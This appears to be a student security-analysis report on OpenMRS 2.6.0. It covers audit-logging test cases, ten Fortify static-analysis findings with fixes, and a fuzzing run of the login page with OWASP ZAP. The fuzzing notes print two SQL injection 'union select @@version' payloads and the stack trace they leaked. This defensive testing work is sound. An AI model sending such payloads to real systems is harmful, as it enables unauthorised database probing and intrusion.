# CAC515 - Project Part 3: Audit/logging, Static Analysis, Fuzzing, and Requirements #

### Tam Nguyen
### Xiangqing Ding	
### Zhuo Li	
### Fuxing Luan
# Audit/Logging Ismplementation #

## Test case: U-1

`DESIGNER : [Fuxing Luan]`
`UPDATED ON : [10/24/2017]`

### Name of module : [ Update ]

### Test Description
When someone adds a patient’s information, the username, IP address, and time should be logged.

### * Precondition
1. A local computer with administrator privilege
2. Java environment installed
3. OpenMRS Standalone Version 2.6.0 downloaded and unzipped
4. Latest Chrome browser

### * Assumption
3. OpenMRS with demo database runs normally

### * Test Data
1. Username: `Admin`
2. Password: `Admin123`

### * Test steps
1. Start local openMRS and log in with the username and account
2.	Click “Register a patient” in the main page
3.	Input Kobe in Given field and Bryant in Family Name field
4.	Choose Male as gender
5.	Let the birthday be 8/23/1978
6.	Address as Staples Center, Los Angeles, CA, Los Angeles, 90001
7.	Phone 555-555-5555
8.	No relatives

### * Expected logged info
1. username
2. time
3. ip address
4. computer id

### * Actual results
INFO - LoggingAdvice.invoke(115) |2017-10-24 14:17:28,252| In method PatientService.savePatient. Arguments: Patient=Patient#null, 
INFO - LoggingAdvice.invoke(155) |2017-10-24 14:17:28,279| Exiting method savePatient
INFO - LoggingAdvice.invoke(115) |2017-10-24 14:17:28,738| In method UserService.saveUser. Arguments: User=admin, 
INFO - LoggingAdvice.invoke(155) |2017-10-24 14:17:28,745| Exiting method saveUser

### Test status : [ fail ]

No IP address or computer ID is tracked. 
It is inadequate because you cannot tell whether it was operated by the person.



# Test case: U-2

`DESIGNER : [Fuxing Luan]`
`UPDATED ON : [10/24/2017]`

### Name of module : [ Update ]

### Test Description
When someone registers a new patient, his password and session id should not be logged.

### * Precondition
1. A local computer with administrator privilege
2. Java environment installed
3. OpenMRS Standalone Version 2.6.0 downloaded and unzipped
4. Latest Chrome browser

### * Assumption
3. OpenMRS with demo database runs normally

### * Test Data
1. Username: `Admin`
2. Password: `Admin123`

### * Test steps
1. Start local openMRS and log in with the username and account
2.	Click “Register a patient” in the main page
3.	Input Kobe in Given field and Bryant in Family Name field
4.	Choose Male as gender
5.	Let the birthday be 8/23/1978
6.	Address as Staples Center, Los Angeles, CA, Los Angeles, 90001
7.	Phone 555-555-5555
8.	No relatives

### * Expected logged info
1. Not include user password or session id

### * Actual results
INFO - LoggingAdvice.invoke(115) |2017-10-24 14:17:28,252| In method PatientService.savePatient. Arguments: Patient=Patient#null, 
INFO - LoggingAdvice.invoke(155) |2017-10-24 14:17:28,279| Exiting method savePatient
INFO - LoggingAdvice.invoke(115) |2017-10-24 14:17:28,738| In method UserService.saveUser. Arguments: User=admin, 
INFO - LoggingAdvice.invoke(155) |2017-10-24 14:17:28,745| Exiting method saveUser

### Test status : [ fail ]

The password and session id is not be logged 




# Test case: U-3

`DESIGNER : [Fuxing Luan]`
`UPDATED ON : [10/24/2017]`

### Name of module : [ Update ]

### Test Description
When someone update a patient’s information, the username, IP address, and time should be logged.

### * Precondition
1. A local computer with administrator privilege
2. Java environment installed
3. OpenMRS Standalone Version 2.6.0 downloaded and unzipped
4. Latest Chrome browser

### * Assumption
3. OpenMRS with demo database runs normally

### * Test Data
1. Username: `Admin`
2. Password: `Admin123`

### * Test steps
1. Start local openMRS and log in with the username and account
2. Click “Find Patient Record” in the main page
3. Click “Kobe Bryant”
4. Click “Edit”
5. Change the first name to “Koby”
6. Confirm

### * Expected logged info
1. username
2. time
3. ip address
4. computer id

### * Actual results
INFO - LoggingAdvice.invoke(115) |2017-10-24 16:01:45,960| In method PatientService.savePatient. Arguments: Patient=Patient#108, 
INFO - LoggingAdvice.invoke(155) |2017-10-24 16:01:45,996| Exiting method savePatient
INFO - LoggingAdvice.invoke(115) |2017-10-24 16:01:46,297| In method UserService.saveUser. Arguments: User=admin, 
INFO - LoggingAdvice.invoke(155) |2017-10-24 16:01:46,301| Exiting method saveUser

### Test status : [ fail ]

No IP address or computer ID is tracking. 
It is inadequate because you cannot tell whether it was operated by the person.




# Test case: U-4

`DESIGNER : [Fuxing Luan]`
`UPDATED ON : [10/24/2017]`

### Name of module : [ Update ]

### Test Description
When someone updates a new patient, his password and session id should not be logged

### * Precondition
1. A local computer with administrator privilege
2. Java environment installed
3. OpenMRS Standalone Version 2.6.0 downloaded and unzipped
4. Latest Chrome browser

### * Assumption
3. OpenMRS with demo database runs normally

### * Test Data
1. Username: `Admin`
2. Password: `Admin123`

### * Test steps
1. Start local openMRS and log in with the username and account
2. Click “Find Patient Record” in the main page
3. Click “Kobe Bryant”
4. Click “Edit”
5. Change the first name to “Koby”
6. Confirm

### * Expected logged info
user password or session id should not be logged

### * Actual results
INFO - LoggingAdvice.invoke(115) |2017-10-24 16:01:45,960| In method PatientService.savePatient. Arguments: Patient=Patient#108, 
INFO - LoggingAdvice.invoke(155) |2017-10-24 16:01:45,996| Exiting method savePatient
INFO - LoggingAdvice.invoke(115) |2017-10-24 16:01:46,297| In method UserService.saveUser. Arguments: User=admin, 
INFO - LoggingAdvice.invoke(155) |2017-10-24 16:01:46,301| Exiting method saveUser

### Test status : [ pass ]

No private information is exposed




# Test case: U-5

`DESIGNER : [Fuxing Luan]`
`UPDATED ON : [10/24/2017]`

### Name of module : [ Update ]

### Test Description
When someone deletes a patient’s information, the username, IP address, and time should be logged

### * Precondition
1. A local computer with administrator privilege
2. Java environment installed
3. OpenMRS Standalone Version 2.6.0 downloaded and unzipped
4. Latest Chrome browser

### * Assumption
3. OpenMRS with demo database runs normally

### * Test Data
1. Username: `Admin`
2. Password: `Admin123`

### * Test steps
1. Start local openMRS and log in with the username and account
2. Click “Find Patient Record” in the main page
3. Click “Kobe Bryant”
4. Click “Delete Patient”
5. Input “He has no problem” as the reason.
6. Input username and password
7. Confrim

### * Expected logged info
1. username
2. time
3. ip address
4. computer id

### * Actual results
INFO - LoggingAdvice.invoke(115) |2017-10-24 16:46:59,026| In method PatientService.voidPatient. Arguments: Patient=Patient#108, String=He has no problem, 
INFO - LoggingAdvice.invoke(155) |2017-10-24 16:46:59,086| Exiting method voidPatient

### Test status : [ fail ]

No IP address or computer ID is tracking. 
It is inadequate because you cannot tell whether it was operated by the person.




# Test case: D-1

`DESIGNER : [Fuxing Luan]`
`UPDATED ON : [10/24/2017]`

### Name of module : [ Delete ]

### Test Description
When someone deletes a new patient, his password and session id should not be logged

### * Precondition
1. A local computer with administrator privilege
2. Java environment installed
3. OpenMRS Standalone Version 2.6.0 downloaded and unzipped
4. Latest Chrome browser

### * Assumption
3. OpenMRS with demo database runs normally

### * Test Data
1. Username: `Admin`
2. Password: `Admin123`

### * Test steps
1. Start local openMRS and log in with the username and account
2. Click “Find Patient Record” in the main page
3. Click “Kobe Bryant”
4. Click “Delete Patient”
5. Input “He has no problem” as the reason.
6. Input username and password
7. Confrim

### * Expected logged info
user password or session id should not be logged

### * Actual results
INFO - LoggingAdvice.invoke(115) |2017-10-24 16:46:59,026| In method PatientService.voidPatient. Arguments: Patient=Patient#108, String=He has no problem, 
INFO - LoggingAdvice.invoke(155) |2017-10-24 16:46:59,086| Exiting method voidPatient

### Test status : [ pass ]

No private information is exposed



# Test case: V-1

`DESIGNER : [Fuxing Luan]`
`UPDATED ON : [10/24/2017]`

### Name of module : [ View ]

### Test Description
When someone views a patient’s information, the username, IP address, and time should be logged

### * Precondition
1. A local computer with administrator privilege
2. Java environment installed
3. OpenMRS Standalone Version 2.6.0 downloaded and unzipped
4. Latest Chrome browser

### * Assumption
3. OpenMRS with demo database runs normally

### * Test Data
1. Username: `Admin`
2. Password: `Admin123`

### * Test steps
1. Start local openMRS and log in with the username and account
2. Click “Find Patient Record” in the main page
3. Click “Kobe Bryant”


### * Expected logged info
1. username
2. time
3. ip address
4. computer id

### * Actual results
INFO - LoggingAdvice.invoke(115) |2017-10-24 17:01:36,095| In method UserService.saveUser. Arguments: User=nurse, 
INFO - LoggingAdvice.invoke(155) |2017-10-24 17:01:36,098| Exiting method saveUser

### Test status : [ fail ]

No IP address or computer ID is tracking. 
It is inadequate because you cannot tell whether it was operated by the person.



# Test case: V-2

`DESIGNER : [Fuxing Luan]`
`UPDATED ON : [10/24/2017]`

### Name of module : [ View ]

### Test Description
When someone views a new patient, his password and session id should not be logged

### * Precondition
1. A local computer with administrator privilege
2. Java environment installed
3. OpenMRS Standalone Version 2.6.0 downloaded and unzipped
4. Latest Chrome browser

### * Assumption
3. OpenMRS with demo database runs normally

### * Test Data
1. Username: `Admin`
2. Password: `Admin123`

### * Test steps
1. Start local openMRS and log in with the username and account
2. Click “Find Patient Record” in the main page
3. Click “Kobe Bryant”

### * Expected logged info
user password or session id should not be logged

### * Actual results
INFO - LoggingAdvice.invoke(115) |2017-10-24 17:01:36,095| In method UserService.saveUser. Arguments: User=nurse, 
INFO - LoggingAdvice.invoke(155) |2017-10-24 17:01:36,098| Exiting method saveUser

### Test status : [ pass ]

No private information is exposed.


# Test case: V-3

`DESIGNER : [Fuxing Luan]`
`UPDATED ON : [10/24/2017]`

### Name of module : [ View ]

### Test Description
When someone views a patient’s information, the username, IP address, and time should be logged

### * Precondition
1. A local computer with administrator privilege
2. Java environment installed
3. OpenMRS Standalone Version 2.6.0 downloaded and unzipped
4. Latest Chrome browser

### * Assumption
3. OpenMRS with demo database runs normally

### * Test Data
1. Username: `Admin`
2. Password: `Admin123`

### * Test steps
1. Start local openMRS and log in with the username and account
2. Click “Appointment Scheduling” in the main page
3. Click “Manage Appointment”
4. Input “Kobe Bryant” and search


### * Expected logged info
1. username
2. time
3. ip address
4. computer id

### * Actual results
INFO - LoggingAdvice.invoke(115) |2017-10-24 17:01:36,095| In method UserService.saveUser. Arguments: User=nurse, 
INFO - LoggingAdvice.invoke(155) |2017-10-24 17:01:36,098| Exiting method saveUser

### Test status : [ fail ]


No IP address or computer ID is tracking. 
It is inadequate because you cannot tell whether it was operated by the person.



# Test case: V-4

`DESIGNER : [Fuxing Luan]`
`UPDATED ON : [10/24/2017]`

### Name of module : [ View ]

### Test Description
When someone views a new patient's appointment, his password and session id should not be logged

### * Precondition
1. A local computer with administrator privilege
2. Java environment installed
3. OpenMRS Standalone Version 2.6.0 downloaded and unzipped
4. Latest Chrome browser

### * Assumption
3. OpenMRS with demo database runs normally

### * Test Data
1. Username: `Nurse`
2. Password: `Nurse123`

### * Test steps
1. Start local openMRS and log in with the username and account
2. Click “Appointment Scheduling” in the main page
3. Click “Manage Appointment”
4. Input “Kobe Bryant” and search

### * Expected logged info
user password or session id should not be logged

### * Actual results
INFO - LoggingAdvice.invoke(115) |2017-10-24 17:01:36,095| In method UserService.saveUser. Arguments: User=nurse, 
INFO - LoggingAdvice.invoke(155) |2017-10-24 17:01:36,098| Exiting method saveUser

### Test status : [ pass ]

No private information is exposed.

## Static analysis with Fortify ##

### Overview ###

In this part we list 10 security vulnerabilities in OpenMRS and suggest potential fix for each. The prioritization is based on the impact and severity of each vulnerability. The vulnerabilities is prioritized from high to low based on its risk, which is **Risk = Impact · Likelihood**.

### Static Analysis ###

#### 1. SQL Injection ####

| Component 				| Content 		|
| :---                   	| :---         	|
| Vulnerability Description | On line 164 of *MigrateAllergiesChangeSet.java*, the method *getConceptByGlobalProperty()* invokes a SQL query built using input coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands. |
| Potential Fix | 1. Replacing the query execution statement with parameterized SQL statements, which can enforce the behavior by disallowing data-directed context changes and avoiding nearly all SQL injection attacks. <br>2. Another potential fix is adopting modern web framework. A number of modern web frameworks provide mechanisms for performing validation of user input, like Struts and Spring MVC. But the cost of changing design or architecture of current application may be very high. | 
| Impact | 5.0 |
| Likelihood | 5.0 |
| **Risk** | 25.0 |


#### 2. Command Injection ####

| Component 				| Content 		|
| :---                   	| :---         	|
| Vulnerability Description | The method *execMysqlCmd()* in *MigrateDataSet.java*:187 calls *exec()* with a command built from untrusted data. This call can cause the program to execute malicious commands on behalf of an attacker. |
| Potential Fix | 1. Building a filter / validation method that check the command before the command is executed by *execMysqlCmd()*. The input could be selected from a predetermined set of safe commands (whitelist). <br>2. Also, another potential fix is adopting modern web framework. A number of modern web frameworks provide mechanisms for performing validation of user input, like Struts and Spring MVC. But the cost of changing design or architecture of current application may be very high. | 
| Impact | 5.0 |
| Likelihood | 3.2 |
| **Risk** | 16.0 |


#### 3. Privacy Violation ####

| Component 				| Content 		|
| :---                   	| :---         	|
| Vulnerability Description | The method *authenticate()* in *Context.java*:287 mishandles confidential information, which can compromise user privacy and is often illegal. More specifically, the password enters the program, and the statement `log.debug("Authenticating with username: " + username);` in *authenticate()* will display the username in log when debug is enabled. |
| Potential Fix | 1. One potential fix for this problem is minimizing the exposure of sensitive data and encrypting them if they are needed. <br>2. Making sure the source code of the application cannot be decompiled and interpolated by others. | 
| Impact | 4.0 |
| Likelihood | 2.8 |
| **Risk** | 11.2 |


#### 4. Password in Configuration File ####

| Component 				| Content 		|
| :---                   	| :---         	|
| Vulnerability Description | In *liquibase-core-data.xml*:5, the password is stored as plaintext in the configuration file. Storing a plaintext password in a configuration file may result in a system compromise. |
| Potential Fix | 1. One potential fix for this problem is encrypting the password field or the whole configuration file, then the plaintext password will not be retrieved by attacker. <br>2. Another potential fix is assigning access permission on the configuration file. So the plaintext password is not accessible to the attackers without permission. | 
| Impact | 4.0 |
| Likelihood | 2.4 |
| Risk | 9.6 |


#### 5. Path Manipulation ####

| Component 				| Content 		|
| :---                   	| :---         	|
| Vulnerability Description | Attackers are able to control the file system path argument to *File()* at *AbstractHandler.java* line 169, which allows them to access or modify otherwise protected files. |
| Potential Fix | 1. Create a list of legitimate resource names that a user is allowed to specify, and only allow the user to select from the list. With this approach the input provided by the user is never used directly to specify the resource name. <br>2. Another potential fix is adopting modern web framework. A number of modern web frameworks provide mechanisms for performing validation of user input, like Struts and Spring MVC. But the cost of changing design or architecture of current application may be very high.| 
| Impact | 3.0 |
| Likelihood | 2.95 |
| **Risk** | 8.85 |


#### 6.Singleton Member ####

| Component 				| Content 		|
| :---                   	| :---         	|
| Vulnerability Description | The class *AdministrationServiceImpl* is a singleton, so the member field *globalLocaleList* is shared between users. The result is that one user could see another user's data. |
| Potential Fix | 1. For this problem, one potential fix is declaring a separate class and using the Servlet only to wrap the new class. <br>2. Changing the design of *AdministrationServiceImpl* and placing the member field *globalLocaleList* into another class. | 
| Impact | 4.0 |
| Likelihood | 2.0 |
| **Risk** | 8.0 |


#### 7. Server-Side Request Forgery ####

| Component 				| Content 		|
| :---                   	| :---         	|
| **Vulnerability Description** | The function *openConnection()* on line 720 initiates a network connection to a third-party system using user-controlled data for resource URI. An attacker may leverage this vulnerability to send a request on behalf of the application server since the request will originate from the application server internal IP. |
| **Potential Fix** | 1. Change the design of this part. Do not establish network connections based on user-controlled data and ensure that the request is being sent to the expected destination. If user data is necessary to build the destination URI, use a level of indirection: create a list of legitimate resource names that a user is allowed to specify, and only allow the user to select from the list. With this approach the input provided by the user is never used directly to specify the resource name. <br>2. Another approach is to create a whitelist of characters that are allowed to appear in the resource name and accept input composed exclusively of characters in the approved set. | 
| Impact | 3.0 |
| Likelihood | 2.4 |
| **Risk** | 7.2 |


#### 8. Hardcoded Encryption Key ####

| Component 				| Content 		|
| :---                   	| :---         	|
| Vulnerability Description | In *OpenmrsConstants.java*:532, the encryption key is hardcoded in the program. Hardcoded encryption keys may compromise system security in a way that cannot be easily remedied. |
| Potential Fix | 1. Encryption keys should never be hardcoded. They should be obfuscated and managed in an external source. <br>2. Another fix for this problem is replacing the hardcoded keys with a method that generates random keys. | 
| Impact | 3.0 |
| Likelihood | 2.4 |
| **Risk** | 7.2 |


#### 9. Denial of Service: Regular Expression ####

| Component 				| Content 		|
| :---                   	| :---         	|
| Vulnerability Description | In *HibernatePatientDAO.java*:772, untrusted data is passed to the application and used as a regular expression. This can cause the thread to over-consume CPU resources. |
| Potential Fix | 1. Do not allow untrusted data to be used as regular expression patterns. Build a filter that check the input data | 
| Impact | 3.0 |
| Likelihood | 2.13 |
| **Risk** | 6.39 |


#### 10. Log Forging ####

| Component 				| Content 		|
| :---                   	| :---         	|
| Vulnerability Description | The method *becomeUser()* in *Context.java* writes unvalidated user input to the log on line 328. An attacker could take advantage of this behavior to forge log entries or inject malicious content into the log. |
| Potential Fix | 1. Prevent log forging attacks with indirection: create a set of legitimate log entries that correspond to different events that must be logged and only log entries from this set. To capture dynamic content, such as users logging out of the system, always use server-controlled values rather than user-supplied data. This ensures that the input provided by the user is never used directly in a log entry. <br>2. Another potential fix is adopting modern web framework. A number of modern web frameworks provide mechanisms for performing validation of user input, like Struts and Spring MVC. Thus the attacker cannot put malicious code into the log | 
| Impact | 2.5 |
| Likelihood | 2.21 |
| **Risk** | 5.525 |
# Fuzz -1- LOGIN PAGE INJECTION
### Priority : HIGH
### Test status : FAILED
`DESIGNER : TAM N NGUYEN` <br/>
`EXECUTED BY : TAM N NGUYEN` <br/>
`UPDATED ON : 20OCT17` <br/>
`EXECUTED ON : 20OCT17` <br/>

### * Description
#### Name of module : OpenMRS login
+ Page location : http://localhost:8081/openmrs-standalone/login.htm
+ Fuzz string : username=admin&password=<<fuzz data>>&sessionLocation=2&redirectUrl=
+ Fuzz data : jbrofuzz pre-installed rules in OWASP scanner
Fuzzer will deploy 199 injection attack strings on the variable "password" in form of POST requests. Server HttpResponses will be analyzed and be decided if the attacks were successful or not.


### * Precondition
1. A local computer with administrator privilege
2. Java JRE installed
3. OpenMRS Standalone Version 2.6.0 downloaded and unziped
4. OWASP ZAP Version 2.6.0 downloaded and installed

### * Dependencies
1. OpenMRS with demo database was loaded and runs normally
2. OWASP ZAP runs normally

### * Test Data
jbrofuzz rules came standard with OWASP Zap

### * Test steps
1. Open up OpenMRS V. 2.6.0 Standalone. Make sure Tomcat Port is 8081 and MySQL port is 3316. A web page starting with localhost:8081 will be automatically opened upon successful start.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/portSettings.png)

2. Open OWASP Zap V2.6.0
3. From OWASP Zap, go to Toos > Launch the Zap JxBrowser
4. In the Zap JxBrowser, type "http://localhost:8081/openmrs-standalone/login.htm" (without the double quotes) into the address bar and hit Enter
5. Go to the main Zap window, on the left side bar, in "Sites" tab, under "Sites" sub section, you will now see "http://localhost:8081". Expand that until you see "GET:login.htm". If you don't see it, please go to the JzBrowser and make sure the login page is loaded. If the page is not loaded, you need to double check the OpenMRS to make sure it runs properly

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/sitesLoaded.png)

6. Go back to the Zap JxBrowser and type a bogus pair of username/password (we use "admin" for username and "BBBBB" for password), select "Pharmacy" section and click login. When the page got reloaded with "Invalid username/password. Please try again", close JxBrowser window and get back to main Zap window

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/adminLoginScreen.png)

7. In zap window, if you see "POST:login.htm(password, redirectURL,sessionLocation,username)" on the left panel (the "Sites" panel) then you got it, if not, please repeat step 3 to 5
8. Select "POST:login.htm(password, redirectURL,sessionLocation,username)" from the left panel and select the "Request" tab on the right panel. The right panel will turn into 2 smaller panels. At the bottom one, you will see "username=admin&password=BBBBB&sessionLocation=2&redirectUrl="
9. Highlight the "BBBBB" part from the string you got in previous step, right click on it and choose "Fuzz". A Fuzzer window will be opened.

![alt text](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/openFuzzMenu.png)

10. In the fuzzer window, click "Payloads..." button. A child window will be opened

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/fuzzerWindow.png)

11. In the child "Payloads" window, click "Add". An "Add payload" window will be opened
12. In "Add payload window, in the "Type" box, choose "File Fuzzers". Expand the "jbrofuzz" section. Check the box of "Injection" and click "Add". The child window will be closed.

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/injectionSelect.png)

13. In Payloads window, click "OK" and you will be returned to the "Fuzzer" window. In this window, click "Start Fuzzer" button and you will be returned to the main Zap window with the "Fuzzer" tab selected
14. Observe the results in the "Fuzzer" tab, especially the "Code" and "Size Resp. Body". Check the HTTP response by selecting a fuzz entry, and select the "Response" tab in the uper right panel.

![](https://github.com/genterist/openMRS-Security/blob/master/3-Analysis/images/fuzz-InjectionResults.png)

### * Expected results
+ OpenMRS should redirect invalid logins back to the login page.
+ System has to be able to fail securely.

### * Post-condition
OpenMRS should still be operating normally

### * Actual results
+ 199 fuzz were done on the "password" variable
+ 197 of the entries have 302 code and zero size of Response html body. Confirmed by inspection of html header, noticing that system redirects invalid login to previous page - the login page.
+ 002 of the fuzz entries were able to force system to leak some debugging informations which can be used for further attacks (to be discussed further in the Notes section)
+ We decided that the test is a "FAILED". Even though no exploit directly linked to Injection was successful, the fuzzer was able to leak some important debugging data. 

### * NOTES:

FUZZ STRING USED TO CAUSE THE LEAK
> ' union (select NULL, (select @@version)) --&sessionLocation=2&redirectUrl=

or

> username=admin&password=' union (select NULL, NULL, (select @@version)) --&sessionLocation=2&redirectUrl=

LEAKED SYSTEM INFO

Originally harvested by OWASP fuzzer in HttpResponse and may not be able to reproduce using the regular browser/view source method.
```
<h1>UI Framework Error</h1>

<h2>Root Error</h2>
<pre>com.mysql.jdbc.exceptions.jdbc4.MySQLIntegrityConstraintViolationException: Duplicate entry '1-lockoutTimestamp' for key 'PRIMARY'
	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
	at java.lang.reflect.Constructor.newInstance(Constructor.java:423)
	at com.mysql.jdbc.Util.handleNewInstance(Util.java:411)
	at com.mysql.jdbc.Util.getInstance(Util.java:386)
	at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:1041)
	at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:4237)
	at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:4169)
	at com.mysql.jdbc.MysqlIO.sendCommand(MysqlIO.java:2617)
	at com.mysql.jdbc.MysqlIO.sqlQueryDirect(MysqlIO.java:2778)
	at com.mysql.jdbc.ConnectionImpl.execSQL(ConnectionImpl.java:2825)
	at com.mysql.jdbc.PreparedStatement.executeInternal(PreparedStatement.java:2156)
	at com.mysql.jdbc.PreparedStatement.executeUpdate(PreparedStatement.java:2441)
	at com.mysql.jdbc.PreparedStatement.executeBatchSerially(PreparedStatement.java:2007)
	at com.mysql.jdbc.PreparedStatement.executeBatch(PreparedStatement.java:1467)
	at com.mchange.v2.c3p0.impl.NewProxyPreparedStatement.executeBatch(NewProxyPreparedStatement.java:1135)
	at org.hibernate.engine.jdbc.batch.internal.BatchingBatch.performExecution(BatchingBatch.java:127)
	at org.hibernate.engine.jdbc.batch.internal.BatchingBatch.doExecuteBatch(BatchingBatch.java:114)
	at org.hibernate.engine.jdbc.batch.internal.AbstractBatchImpl.execute(AbstractBatchImpl.java:163)
	at org.hibernate.engine.jdbc.internal.JdbcCoordinatorImpl.executeBatch(JdbcCoordinatorImpl.java:226)
	at org.hibernate.engine.spi.ActionQueue.executeActions(ActionQueue.java:484)
	at org.hibernate.engine.spi.ActionQueue.executeActions(ActionQueue.java:351)
	at org.hibernate.event.internal.AbstractFlushingEventListener.performExecutions(AbstractFlushingEventListener.java:350)
	at org.hibernate.event.internal.DefaultFlushEventListener.onFlush(DefaultFlushEventListener.java:56)
	at org.hibernate.internal.SessionImpl.flush(SessionImpl.java:1258)
	at org.hibernate.internal.SessionImpl.managedFlush(SessionImpl.java:425)
	at org.hibernate.engine.transaction.internal.jdbc.JdbcTransaction.beforeTransactionCommit(JdbcTransaction.java:101)
	at org.hibernate.engine.transaction.spi.AbstractTransactionImpl.commit(AbstractTransactionImpl.java:177)
	at org.springframework.orm.hibernate4.HibernateTransactionManager.doCommit(HibernateTransactionManager.java:584)
	at org.springframework.transaction.support.AbstractPlatformTransactionManager.processCommit(AbstractPlatformTransactionManager.java:757)
	at org.springframework.transaction.support.AbstractPlatformTransactionManager.commit(AbstractPlatformTransactionManager.java:726)
	at org.springframework.transaction.interceptor.TransactionAspectSupport.completeTransactionAfterThrowing(TransactionAspectSupport.java:553)
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:285)
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:96)
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:179)
	at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:207)
	at com.sun.proxy.$Proxy290.authenticate(Unknown Source)
	at org.openmrs.api.context.UserContext.authenticate(UserContext.java:100)
	at org.openmrs.api.context.Context.authenticate(Context.java:297)
	at org.openmrs.module.referenceapplication.page.controller.LoginPageController.post(LoginPageController.java:217)
	at sun.reflect.GeneratedMethodAccessor542.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:498)
	at org.openmrs.ui.framework.UiFrameworkUtil.invokeMethodWithArguments(UiFrameworkUtil.java:112)
	at org.openmrs.ui.framework.UiFrameworkUtil.executeControllerMethod(UiFrameworkUtil.java:71)
	at org.openmrs.ui.framework.page.PageFactory.handleRequestWithController(PageFactory.java:219)
	at org.openmrs.ui.framework.page.PageFactory.processThisFragment(PageFactory.java:160)
	at org.openmrs.ui.framework.page.PageFactory.process(PageFactory.java:116)
	at org.openmrs.ui.framework.page.PageFactory.handle(PageFactory.java:86)
	at org.openmrs.module.uiframework.PageController.handlePath(PageController.java:116)
	at org.openmrs.module.uiframework.PageController.handleUrlWithDotPage(PageController.java:83)
	at sun.reflect.GeneratedMethodAccessor540.invoke(Unknown Source)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:498)
	at org.springframework.web.bind.annotation.support.HandlerMethodInvoker.invokeHandlerMethod(HandlerMethodInvoker.java:177)
	at org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.invokeHandlerMethod(AnnotationMethodHandlerAdapter.java:446)
	at org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter.handle(AnnotationMethodHandlerAdapter.java:434)
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:943)
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:877)
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:966)
	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:868)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:647)
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:842)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:101)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:101)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:749)
	at org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:487)
	at org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:412)
	at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:339)
	at org.springframework.web.servlet.view.InternalResourceView.renderMergedOutputModel(InternalResourceView.java:168)
	at org.springframework.web.servlet.view.AbstractView.render(AbstractView.java:303)
	at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1228)
	at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1011)
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:955)
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:877)
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:966)
	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:868)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:647)
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:842)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.openmrs.module.web.filter.ForcePasswordChangeFilter.doFilter(ForcePasswordChangeFilter.java:60)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.openmrs.web.filter.GZIPFilter.doFilterInternal(GZIPFilter.java:64)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:243)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
